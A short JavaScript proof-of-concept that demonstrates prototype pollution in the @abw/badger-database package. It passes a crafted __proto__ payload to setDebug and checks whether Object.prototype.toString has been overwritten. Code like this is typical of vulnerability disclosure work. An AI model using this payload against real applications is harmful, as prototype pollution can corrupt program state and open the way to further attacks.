const db = require("@abw/badger-database");

let payload = { ["__proto__"] : { "toString" : "polluted" } };

db.setDebug(payload);

if (({}).toString == "polluted")
  throw Error("I pollute");
